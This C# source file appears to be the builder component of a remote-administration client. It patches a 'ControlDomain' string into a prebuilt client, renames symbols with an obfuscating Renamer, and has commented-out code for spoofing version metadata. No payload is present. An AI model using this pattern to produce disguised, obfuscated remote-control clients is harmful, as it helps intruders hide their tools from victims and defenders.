using Mono.Cecil;
using Mono.Cecil.Cil;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Vestris.ResourceLib;

namespace ClientGenerator
{
    public class ClientBuilder
    {
        private readonly BuildOptions _options;
        private readonly string _clientFilePath;

        public ClientBuilder(BuildOptions options, string clientFilePath)
        {
            _options = options;
            _clientFilePath = clientFilePath;
        }

        /// <summary>
        /// Builds a client executable.
        /// </summary>
        public void Build()
        {
            using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
            {
                // PHASE 1 - Writing settings
                WriteSettings(asmDef);

                // PHASE 2 - Renaming
                Renamer r = new Renamer(asmDef);

                if (!r.Perform())
                    throw new Exception("renaming failed");

                // PHASE 3 - Saving
                r.AsmDef.Write(_options.OutputPath);
            }

            // PHASE 4 - Assembly Information changing
            if (_options.AssemblyInformation != null)
            {
                /*
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(_options.OutputPath);

                versionResource.FileVersion = _options.AssemblyInformation[7];
                versionResource.ProductVersion = _options.AssemblyInformation[6];
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["CompanyName"] = _options.AssemblyInformation[2];
                stringFileInfo["FileDescription"] = _options.AssemblyInformation[1];
                stringFileInfo["ProductName"] = _options.AssemblyInformation[0];
                stringFileInfo["LegalCopyright"] = _options.AssemblyInformation[3];
                stringFileInfo["LegalTrademarks"] = _options.AssemblyInformation[4];
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = _options.AssemblyInformation[5];
                stringFileInfo["OriginalFilename"] = _options.AssemblyInformation[5];

                versionResource.SaveTo(_options.OutputPath);
                */
            }

            // PHASE 5 - Icon changing
        }

        private void WriteSettings(AssemblyDefinition asmDef)
        {
            // https://stackoverflow.com/a/49777672 RSACryptoServiceProvider must be changed with .NET 4.6
            //StreamWriter file = new StreamWriter("Debug-Log-Client.txt", append: true);

            foreach (var typeDef in asmDef.Modules[0].Types)
            {
                if (typeDef.FullName == "DemoService.Settings")
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            int strings = 1, bools = 1;

                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                            {
                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr) // string
                                {
                                    switch (strings)
                                    {
                                        case 1: //ControlDomain
                                            methodDef.Body.Instructions[i].Operand = _options.StrInject;
                                            break;
                                    }
                                    strings++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_1 ||
                                         methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_0) // bool
                                {
                                    
                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4) // int
                                {


                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_S) // sbyte
                                {
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
